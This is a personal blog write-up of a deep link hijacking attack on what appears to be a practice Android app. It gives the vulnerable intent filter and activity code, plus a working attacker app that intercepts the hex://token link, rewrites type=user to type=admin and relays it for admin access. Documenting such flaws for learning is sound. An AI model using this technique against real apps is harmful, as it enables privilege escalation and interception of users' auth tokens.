---
layout: post
title: How I Gained Admin Access Through DeepLink Hijacking
date: 2025-03-14 20:53 +0200
catgeories: Mobile
tags: Android Mobile
---

Hello everyone! Today, I’ll walk you through how to exploit a DeepLink hijacking vulnerability to gain admin access.<br>
Let’s dive right in.

## Step 1: Analyzing the AndroidManifest
While reviewing the `AndroidManifest.xml`, I noticed an `exported` activity with the following BROWSABLE intent filter:
```java
<intent-filter>  
    <action android:name="android.intent.action.VIEW" />  
    <category android:name="android.intent.category.DEFAULT" />  
    <category android:name="android.intent.category.BROWSABLE" />  
    <data  
        android:scheme="hex"  
        android:host="token" />  
</intent-filter>
```
This exported activity allows external applications or browsers to interact with it using the `hex://token` scheme and host combination.
## Step 2: Reviewing the Source Code
Here’s the relevant snippet of the activity’s code:
```java
  public void onCreate(Bundle bundle) {  
    super.onCreate(bundle);  
    Intent intent = getIntent();  
    if (intent == null || intent.getAction() == null) {  
        finish();  
        return;  
    }  

    if (intent.getAction().equals("android.intent.action.VIEW")) {  
        Uri data = intent.getData();  
        String type = data.getQueryParameter("type");  
        String authToken = data.getQueryParameter("authToken");  
        String authChallenge = data.getQueryParameter("authChallenge");  
        String savedChallenge = SolvedPreferences.getString(getPrefixKey("challenge"));  

        if (type == null || authToken == null || authChallenge == null || !authChallenge.equals(savedChallenge)) {  
            Toast.makeText(this, "Invalid login", Toast.LENGTH_SHORT).show();  
            finish();  
            return;  
        }  

        if (type.equals("user")) {  
            Toast.makeText(this, "User login successful", Toast.LENGTH_SHORT).show();  
        } else if (type.equals("admin")) {  
            Log.i("Flag14", "hash: " + authToken);  
            Toast.makeText(this, "Admin login successful", Toast.LENGTH_SHORT).show();  
            success(this);  
        }  
    }  
}
```
### Key takeaways from the code:
- The `type`, `authToken`, and `authChallenge` parameters are validated.
- A specific `authChallenge` must match a saved value to proceed.
- If the `type` parameter is set to `"admin"` and the hash of `authToken` matches a predefined value, admin login is granted.

## Step 3: Crafting the Exploit
To exploit this vulnerability, I created an attack application with the same intent filter in its **AndroidManifest.xml:**
```java
<intent-filter>  
    <action android:name="android.intent.action.VIEW" />  
    <category android:name="android.intent.category.DEFAULT" />  
    <category android:name="android.intent.category.BROWSABLE" />  
    <data  
        android:scheme="hex"  
        android:host="token" />  
</intent-filter>
```
This allows my application to intercept the DeepLink.

## Initial Exploit Attempt
Here’s the initial code I used to send an intent via the application’s DeepLink:
```java
protected void onCreate(Bundle savedInstanceState) {  
    super.onCreate(savedInstanceState);  
    setContentView(R.layout.activity_main);  

    ((Button) findViewById(R.id.btn_launch_activity)).setOnClickListener(new View.OnClickListener() {  
        @Override  
        public void onClick(View v) {  
            Intent intent = new Intent();  
            intent.setClassName("com.example", "com.example.connectProperty");  
            startActivity(intent);  
        }  
    });  
}
```
Upon inspecting the intent data, I found a parameter called `type=user`. 
This parameter defines the user’s role:

![](https://miro.medium.com/v2/resize:fit:1062/format:webp/1*53tEwJoEQpkO6MCNj1WsUA.png)

## Exploiting the Vulnerability
What happens if we replace `type=user` to `type=admin`? 🤔

Here’s the final exploit code:
```java
if (intent.getAction().equals("android.intent.action.VIEW")) {  
    Uri data = intent.getData();  
    if (data != null && data.getScheme().equals("hex") && data.getHost().equals("token")) {  
        Intent newIntent = new Intent();  
        newIntent.fillIn(intent, Intent.FILL_IN_DATA | Intent.FILL_IN_ACTION | Intent.FILL_IN_CATEGORIES);  
        newIntent.setClassName("com.example", "com.example.connectProperty");  
        newIntent.setData(Uri.parse(newIntent.getDataString().replace("type=user", "type=admin")));  

        startActivity(newIntent);  
    }  
}
```
By replacing `type=user` with `type=admin` in the DeepLink, I successfully gained admin privileges! 🎉
![](https://miro.medium.com/v2/resize:fit:632/format:webp/1*6VS8_Rk8iYBxPQmvR7CdAQ.png)

## Final Thoughts
This exercise highlights the importance of securely validating input parameters in DeepLink handlers. Improper validation or overly permissive exported activities can lead to severe vulnerabilities like privilege escalation.

**THANKS FOR READING ❤️**

